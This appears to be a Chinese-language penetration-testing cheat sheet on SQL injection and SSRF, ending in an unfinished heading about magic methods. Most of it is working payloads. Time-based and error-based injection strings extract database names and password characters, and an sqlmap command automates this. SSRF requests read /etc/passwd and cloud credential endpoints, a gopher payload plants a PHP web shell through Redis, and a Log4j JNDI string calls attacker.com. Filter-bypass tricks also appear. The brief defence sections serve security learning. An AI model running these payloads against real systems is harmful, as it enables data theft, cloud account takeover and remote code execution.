## SQL注入

- 原理
  - 通过可控变量构造恶意语句并拼接到sql语句中执行
- 条件：
  - 变量可控（有注入点）
  - 能绕过且能带入数据库查询
- 步骤：
  - 判断数据库类型、权限
  - 判断参数类型
  - 明确提交方式
  - 确定数据回显位
  - 获取库名、表名、列名
  - 获取数据或尝试写入命令、提权

### 时间盲注

#### **核心函数**

不同数据库的时间延迟函数各有差异，需根据目标数据库类型选择：

##### **MySQL**

- **`SLEEP(seconds)`**
  使数据库暂停指定秒数。

  ```
  SELECT SLEEP(5);  -- 暂停5秒
  ```

- **`BENCHMARK(count, expr)`**
  通过重复计算表达式制造延迟。

  ```
  SELECT BENCHMARK(1000000, MD5('test'));  -- 执行MD5一百万次
  ```

##### **PostgreSQL**

- **`pg_sleep(seconds)`**
  暂停执行指定秒数。

  ```
  SELECT pg_sleep(5);  -- 暂停5秒
  ```

##### **SQL Server**

- **`WAITFOR DELAY 'time'`**
  延迟指定时间（格式为`HH:MM:SS`）。

  ```
  WAITFOR DELAY '0:0:5';  -- 延迟5秒
  ```

##### **Oracle**

- **`DBMS_PIPE.RECEIVE_MESSAGE('channel', timeout)`**
  通过管道等待消息实现延迟。

  ```
  SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual;  -- 延迟5秒
  ```

------

#### **时间盲注原理**

1. **条件触发延迟**
   构造SQL语句，使得当特定条件为真时触发延迟，否则立即返回。
   **示例**：

   ```
   AND IF(SUBSTRING(DATABASE(),1,1)='a', SLEEP(5), 0)
   ```

   - 若当前数据库名的首字母为`a`，则延迟5秒，否则无延迟。

2. **逐字符推断**
   通过遍历字符（ASCII值）和位置，逐个判断字符内容。
   **示例**：

   ```
   AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(2), 0)
   ```

   - 若密码首字符的ASCII码为97（即字母`a`），则延迟2秒。

3. **响应时间分析**
   对比页面响应时间，判断条件是否成立。通常需多次请求以减少误差。

------

#### **时间盲注利用步骤**

##### **1. 确认注入点与数据库类型**

- 输入单引号`'`、`AND 1=1`、`AND 1=2`等测试是否存在注入。
- 根据错误信息或特征函数推断数据库类型（如`@@version`为SQL Server）。

##### **2. 构造延迟Payload**

- **MySQL**：

  ```
  ' AND IF(1=1, SLEEP(5), 0) -- 
  ```

- **PostgreSQL**：

  ```
  '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END -- 
  ```

- **SQL Server**：

  ```
  '; IF 1=1 WAITFOR DELAY '0:0:5' -- 
  ```

##### **逐字符提取数据**

- **提取数据库名**：

  ```
  ' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>100, SLEEP(2), 0) -- 
  ```

- **提取表名**：

  ```
  ' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))=97, SLEEP(2), 0) -- 
  ```

- **提取字段值**：

  ```
  ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(2), 0) -- 
  ```

##### **自动化工具加速**

使用工具（如`sqlmap`）自动化注入：

```
sqlmap -u "http://example.com/page?id=1" --technique=T --time-sec=2 --batch
```

- `--technique=T`：指定时间盲注。
- `--time-sec=2`：设置延迟阈值。

------

#### **绕过过滤与优化技巧**

1. **编码绕过**

   - 十六进制编码：`SLEEP(5)` → `0x534c454550283529`
   - URL编码：`SLEEP` → `%53%4C%45%45%50`

2. **多语句分隔符**

   - SQL Server：`;`分隔多个语句。
   - MySQL：需启用`multi_statements`。

3. **缩短延迟时间**
   使用更短的延迟（如0.5秒）减少总耗时：

   ```
   ' AND IF(1=1, SLEEP(0.5), 0) -- 
   ```

4. **位运算加速**
   通过二进制逐位判断（如判断ASCII码的每一位）减少请求次数：

   ```
   ' AND IF(ASCII(SUBSTRING(...)) & 1 = 1, SLEEP(2), 0) -- 
   ```

------

#### **防御措施**

1. **参数化查询**
   使用预编译语句（如`PreparedStatement`）避免SQL拼接。
2. **输入过滤**
   过滤特殊字符（`'`、`;`、`--`）或禁用危险函数（`SLEEP`、`WAITFOR`）。
3. **最小化权限**
   数据库账户仅授予必要权限（如禁用`FILE`、`EXECUTE`）。
4. **速率限制与监控**
   限制同一IP的请求频率，监控异常长时间请求。

### 报错注入

#### **MySQL**

- **`updatexml()` 和 `extractvalue()`**

  - **原理**：处理XML数据时，若XPath格式非法，报错信息会包含非法内容。

  - **示例**：

    ```
    AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)
    ```

    错误信息会返回类似 `XPATH syntax error: '~root@localhost~'`。

- **`floor() + rand() + group by`**

  - **原理**：`group by`与`rand()`组合导致主键冲突，报错信息包含查询结果。

  - **示例**：

    ```
    SELECT count(*), concat((SELECT database()), floor(rand()*2)) AS x FROM information_schema.tables GROUP BY x;
    ```

    报错信息显示重复键值，如 `Duplicate entry 'database1'`。

- **`exp()` 溢出**

  - **原理**：超大数值导致指数函数溢出。

  - **示例**：

    ```
    AND exp(~(SELECT * FROM (SELECT user())x))
    ```

    报错信息包含 `DOUBLE value is out of range` 及用户信息。

- **地理空间函数（如`geometrycollection()`）**

  - **示例**：

    ```
    SELECT geometrycollection((SELECT * FROM (SELECT user())a));
    ```

    报错提示参数格式错误并返回数据。

#### **SQL Server**

- **类型转换错误**

  - **示例**：

    ```
    SELECT convert(int, (SELECT @@version));
    ```

    若版本信息含非数字字符，触发转换错误并返回信息。

## SSRF

### 原理

调用服务器端向内网的功能或资源发起恶意请求，可利用SSRF后进一步渗透内网、读取敏感信息或提升权限。

### 利用

#### **访问内部服务**

**原理**：利用SSRF探测或攻击内网中不可直接访问的服务（如数据库、缓存、管理后台）。
**示例**：

```
http://vuln.com/api?url=http://192.168.1.100:8080/admin
```

#### **读取本地文件**

**原理**：利用协议（如`file://`）读取服务器本地文件。
**示例**：

```
http://vuln.com/api?url=file:///etc/passwd        # Linux
http://vuln.com/api?url=file:///C:/Windows/win.ini # Windows
```

#### **攻击云元数据服务**

**原理**：云服务器（AWS、Azure、GCP等）的元数据接口（如`169.254.169.254`）可能暴露敏感信息（如临时凭证）。
**示例**：

- **AWS EC2**：

  ```
  http://vuln.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```

- **阿里云**：

  ```
  http://vuln.com/api?url=http://100.100.100.200/latest/meta-data/
  ```

- **利用流程**：

  1. 获取临时凭证（Access Key ID、Secret Access Key、Token）。
  2. 使用凭证调用云服务API（如AWS CLI）接管云资源。

------

#### **协议利用与RCE**

**原理**：利用支持的协议（如`gopher://`、`dict://`、`smtp://`）构造请求，攻击内网服务。
**示例**：

- **攻击Redis未授权访问**（写入SSH密钥）：

  ```
  http://vuln.com/api?url=gopher://192.168.1.5:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C?php system($_GET['c']);?%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
  ```

- **攻击FastCGI**（PHP-FPM）：

  ```
  http://vuln.com/api?url=gopher://127.0.0.1:9000/_<构造的FastCGI Payload>
  ```

#### **内网应用漏洞利用**

**原理**：结合内网应用的已知漏洞（如Struts2 RCE、Log4j）进行攻击。
**示例**：

```
http://vuln.com/api?url=http://192.168.1.10:8080/action?payload=${jndi:ldap://attacker.com/exp}
```

------

#### **绕过限制技巧**

- **DNS重绑定**：
   利用DNS解析延迟，绕过IP黑名单：

   http://vuln.com/api?url=http://attacker-controlled-domain.com（配置DNS TTL为0，解析到内网IP）

   - 句号绕过：127。0。0。1

- **302跳转**：
   控制外部服务返回302跳转到内网地址：

   ```
   http://vuln.com/api?url=http://attacker.com/redirect（返回Location: http://192.168.1.100）
   ```

- 短网址绕过

  ```
  百度短地址https://dwz.cn/
  ```

- 利用**[::]**

  ```
  http://127.0.0.1>>http://[::127.0.0.1]
  ```

   @符号绕过（http://evil.com@10.0.0.1

### **防御与检测**

- **输入过滤**：禁止`file://`、`gopher://`等危险协议，限制请求目标IP范围。
- **白名单机制**：仅允许访问预设的域名或IP。

#### 原理

##### 魔术方法

对象被销毁时（回收GC）触发
